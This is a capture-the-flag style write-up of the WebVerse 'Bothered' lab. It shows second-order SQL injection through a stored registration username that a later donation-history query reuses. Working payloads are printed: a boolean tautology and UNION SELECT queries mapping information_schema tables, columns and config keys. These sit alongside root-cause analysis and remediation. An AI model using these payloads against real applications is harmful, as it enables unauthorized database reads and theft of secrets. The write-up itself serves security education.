---
title: "WebVerse Bothered - Second-Order SQL Injection via Stored Username"
date: 2026-08-10T00:00:00+02:00
lastmod: 2026-08-13T00:00:00+02:00
draft: false
author: "Mdk22"
description: "A stored username was inserted into a later donation-history query, causing second-order SQL injection and cross-account data exposure."
summary: "A self-created account stored a SQL-significant username that was interpreted only when the authenticated history page reused it. Caido captured the error, boolean, UNION, and final solved-state checks."
categories:
  - "Web Security Write-Ups"
tags:
  - "WebVerse"
  - "Bothered"
  - "SQL Injection"
  - "Second-Order SQL Injection"
  - "Stored Input"
  - "Caido"
  - "CWE-89"
  - "CWE-209"
platform: "WebVerse"
lab: "Bothered"
difficulty: "Easy"
showToc: true
TocOpen: false
case_id: "CASE-009"
case_featured: false
case_summary_short: "A stored username was reused in a later SQL query, exposing cross-account donation records and one selected configuration value."
case_status: "SOLVED / VERIFIED"
case_classification: "Second-Order SQL Injection"
case_family: "server-side-injection"
case_evidence:
  - "Caido"
  - "Chromium"
case_verified: true
case_caido: true
case_independent_curl: false
primary_cwe: "CWE-89"
cwes:
  - "CWE-89"
  - "CWE-209"
patterns:
  - "SQL Injection"
  - "Sensitive Configuration Disclosure"
methods:
  - "Consumer Mapping"
  - "Invalid-versus-Valid Differential"
  - "Authoritative Status Check"
---

> **Publication note:** This article covers a fresh reproduction in an authorized WebVerse lab. Temporary hostnames, credentials, sessions, test-account names, and the literal flag are excluded. The public version uses `WEBVERSE{REDACTED}`. The SQL checks and metadata payloads were reproduced, but the final query containing the secret remains private.

## Executive Summary

Bothered exposed a second-order SQL injection in an authenticated donation-history workflow. A user-controlled username was accepted during normal registration and remained usable for the same account's login. The risk appeared only later, when the server-side history consumer reused that persisted identity in SQL query construction.

A normal self-owned account showed how registration, login, and donation history should behave. I then created a second account with SQL-significant input in its username. Registration and login still worked, but opening the history page produced a PDO/MariaDB syntax error. A valid boolean condition later expanded the result set and included a known donation from the first account. The existing three-field history view was then reused to read only the table names, relevant columns, key names, and one redacted flag value.

I submitted the flag immediately after that read. WebVerse reported **Challenge Solved** and **Flag accepted**. I did not test writes, deletes, password extraction, filesystem access, or unrelated data.

> **CONFIRMED FINDING**
>
> A stored username becomes SQL only when the authenticated donation-history page later inserts it into a dynamic query. This exposed donation records from another test account, a small amount of database metadata, and one configuration value that WebVerse accepted as the flag.

## 1. Report Profile

| Field | Verified value |
| --- | --- |
| Platform | WebVerse |
| Lab | Bothered |
| Difficulty | Easy |
| Status | Solved / Verified |
| Stored source | Registration username |
| Later consumer | Authenticated donation-history workflow |
| Observed stack | PHP 8.2.31, PDO, MariaDB |
| Primary weakness | [CWE-89](/cwes/cwe-89/): SQL Injection |
| Supporting weakness | [CWE-209](/cwes/cwe-209/): verbose PDO/MariaDB error disclosure |
| Evidence | Fresh-instance Caido evidence with Chromium solved-state confirmation |

## 2. Scope and Evidence Boundary

- Every test used a fresh, self-created account; no foreign credentials or historical sessions were reused.
- Each test value used a separate account, so every response could be tied to one stored username.
- I created one harmless donation under the first account. It provided a normal history entry and a known marker for the cross-account check.
- P-01 through P-05 are exact test values used in this authorized lab. Dynamic host, session, credential, and flag values are not published.
- The evidence covers a `SELECT`-based read only. I did not test database writes, filesystem access, command execution, password extraction, or anything outside the lab.

## 3. Step-by-Step Reproduction

Each SQL value below was stored as the raw `username` of a separate self-owned account and then reused unchanged during login. Nothing happened until the authenticated `GET /donations.php` page reused that stored value. Each step keeps the request, payload, expected result, screenshot, and short conclusion together.

### 3.1 Stored-Input Lifecycle and Consumer Model

![Educational lifecycle diagram showing registration, own-account login, the later history consumer, and SQL execution](Bothered_Figure_00_Stored_Input_Lifecycle.png)

**Figure 0: Stored-input lifecycle.** This explanatory diagram connects registration, persistence, normal authentication, and the later SQL consumer. It is not a modified evidence artifact and contains no payload or instance-specific value.

Harmless HTML markers in `display_name` and the donation message were encoded, so those browser-side checks did not show stored XSS. The confirmed issue is server-side: the stored username reaches a later history query and is interpreted as SQL.

> **SECOND-ORDER BOUNDARY**
>
> Registration stores the test value, and login authenticates the same account. Neither action executes SQL from the username. The later history request adds no new payload; it simply reaches the vulnerable consumer.

### 3.2 Normal Account and Donation-History Baseline

I first used a normal self-owned account to record the expected flow. One harmless `5.00` **Share** donation created a known row for the later cross-account comparison.

**R-01: Baseline registration.**

```http
POST /register.php HTTP/1.1
Host: <LAB_HOST>
Content-Type: application/x-www-form-urlencoded

display_name=<CONTROLLED_NAME>&email=<UNIQUE_LAB_EMAIL>&username=<CONTROLLED_USERNAME>&password=<REDACTED>&password_confirm=<REDACTED>
```

**Expected result:** HTTP 302 with `Location: /login.php?welcome=1`. This proves only the normal write-path contract.

**R-02: Baseline login.**

```http
POST /login.php HTTP/1.1
Host: <LAB_HOST>
Content-Type: application/x-www-form-urlencoded

username=<SAME_CONTROLLED_USERNAME>&password=<REDACTED>
```

**Expected result:** HTTP 302 with `Location: /index.php`. This confirms login, not SQL execution.

**R-03: Authenticated history consumer.**

```http
GET /donations.php HTTP/1.1
Host: <LAB_HOST>
Cookie: PHPSESSID=<SESSION_COOKIE>
```

**Expected result:** HTTP 200 with the normal account's populated history and the legitimate three-field projection: **Amount**, **Message**, and **Date**.

![Normal populated donation-history response with Amount, Message, and Date columns](Bothered_EV01_Normal_History_Baseline.png)

**Figure 1: Normal baseline.** The response shows the normal three-field view and the known donation later used for comparison.

### 3.3 P-01: Stored Input Reaches the Later SQL Sink

A separate account stored the exact encoded username control below, completed login normally, and then requested the same R-03 history consumer. After form decoding, the final character following `--` is a significant literal ASCII space.

```text
username=mmp%27+OR+%271%27%3D%271%27+--+
```

**Expected result:** the later `GET /donations.php` returns `SQLSTATE[42000]` with a MariaDB syntax failure near the query's `ORDER BY created_at DESC` suffix.

![PDO and MariaDB syntax error in the later donation-history consumer](Bothered_EV02_PDO_SQL_Error_Oracle.png)

**Figure 2: Later SQL sink.** The response ties the stored value to a later SQL parser error. This confirms the source-to-sink path, but an error alone is not proof of data extraction.

### 3.4 P-02: Boolean Result-Set Comparison

A fresh account stored a syntactically valid boolean control. In form transport, `#` is encoded as `%23`.

```text
mmp' OR '1'='1' #
```

**Expected result:** the new account's later history expands beyond its own records and includes the known `5.00` **Share** donation created under the separate baseline account.

![Expanded donation-history response containing multiple records and the known Share baseline row](Bothered_EV03_Boolean_Result_Set_Expansion.png)

**Figure 3: Boolean check.** The known donation from the other test account appears in the result. This is direct result-set evidence, not an inference based on status code, body length, or timing.

### 3.5 P-03: Current-Schema Table Mapping

The normal view already showed three fields, so the UNION used matching numeric, text, and date/time expressions without sweeping for a column count. Returned text stayed inside the existing **Message** field.

```text
mmp' UNION SELECT 0,GROUP_CONCAT(table_name),NOW()
FROM information_schema.tables
WHERE table_schema=database() #
```

**Expected result:** the Message field returns only the current-schema table names `users,donations,config`.

![Three-column UNION projection returning users, donations, and config in the Message field](Bothered_EV04_UNION_Table_Names.png)

**Figure 4: Table mapping.** The response lists table names only. It does not read their contents.

### 3.6 P-04: `config` Column Mapping

The next payload constrained `information_schema` metadata to the already identified `config` table.

```text
mmp' UNION SELECT 0,GROUP_CONCAT(column_name),NOW()
FROM information_schema.columns
WHERE table_schema=database() AND table_name='config' #
```

**Expected result:** the Message field returns `name,value`.

![Projection returning the config column names name and value](Bothered_EV05_Config_Columns.png)

**Figure 5: Column mapping.** The result shows the key/value layout needed for the next lookup.

### 3.7 P-05: Flag-Key Mapping

Only the `config` key names were read. Their values were left untouched.

```text
mmp' UNION SELECT 0,GROUP_CONCAT(name),NOW() FROM config #
```

**Expected result:** the Message field returns `charity_reg,contact_email,founding_year,site_flag` and identifies the flag key before any value is read.

![Projection returning configuration key names including site_flag](Bothered_EV06_Config_Key_Names.png)

**Figure 6: Key mapping.** The response identifies `site_flag`. No configuration values are returned at this step.

### 3.8 P-06: Targeted Flag Read

The three-column projection was limited to the confirmed `config` table and the `site_flag` key. The final selector and literal flag remain private, so the article does not publish a reusable secret-bearing query.

**Expected result:** one value appears in the existing Message field and matches the WebVerse objective format. Its public representation is `WEBVERSE{REDACTED}`.

![Redacted WebVerse objective value shown in the Message field](Bothered_EV07_Objective_Read_REDACTED.png)

**Figure 7: Targeted flag read.** The earlier steps had already confirmed the column alignment, table, and key. This request returned the single redacted value, and no other schema or configuration values were read afterward.

### 3.9 WebVerse Solved State and Stop Point

I submitted the flag immediately after P-06. WebVerse reported **Challenge Solved** and **Flag accepted**, confirming that the value from the history page was correct.

![WebVerse challenge solved dialog for Bothered showing Flag accepted](Bothered_EV08_Challenge_Solved.png)

**Figure 8: WebVerse solved state.** WebVerse accepted the reproduced Bothered flag.

> **WHERE TESTING STOPPED**
>
> Testing stopped after the single approved value was read and accepted. No curl, shell, destructive SQL, bulk extraction, write or delete action, password extraction, filesystem access, persistence, command execution, or unrelated data collection was performed or added retrospectively.

## 4. Root Cause and CWE Mapping

The root cause is [CWE-89](https://cwe.mitre.org/data/definitions/89.html): externally influenced data changes SQL structure instead of remaining bound data. Here, the relevant failure occurs in the later read path, not necessarily where the username is first stored.

The verbose PDO/MariaDB error is a separate [CWE-209](/cwes/cwe-209/) issue. It exposed SQLSTATE details, the database engine, a filesystem path, a source line, and part of the query. It supports the finding but does not replace the SQL injection proof. Registration accepting the username also says nothing about whether its `INSERT` was parameterized. The confirmed flaw is in the later history query.

## 5. Impact

Inside the lab, the issue exposed SQL parser details, donation records from another test account, limited schema information, configuration key names, and one selected configuration value.

The reproduction intentionally did **not** test writes, deletes, filesystem reads, operating-system command execution, password extraction, persistence, or access beyond the current lab instance. Those capabilities must not be inferred from the confirmed evidence.

## 6. Remediation

1. **Parameterize every later query.** Persisted user-controlled values remain untrusted whenever they enter a new SQL context.
2. **Bind history to an immutable server-derived user ID.** Do not construct authorization or history selection from a mutable username.
3. **Suppress user-facing database errors.** Log exceptions internally and return a generic error response without SQLSTATE values, engine details, filesystem paths, source lines, or query fragments.
4. **Apply database least privilege.** The donation-history role should not be able to read secret-bearing configuration values.
5. **Regression-test the lifecycle.** Store a quote/comment-bearing test value, log in normally, and exercise every later consumer. The consumer must return only that account's authorized records and never expose a database exception.

## Conclusion

Bothered shows why stored input must remain untrusted every time it reaches a new interpreter. The full chain starts with a normal account, triggers a SQL error only on the later history page, confirms cross-record reads with a boolean condition, maps the minimum metadata needed for one flag read, and ends when WebVerse accepts the result.

The public result is recorded as `WEBVERSE{REDACTED}`. Testing stopped at the confirmed, read-only objective.
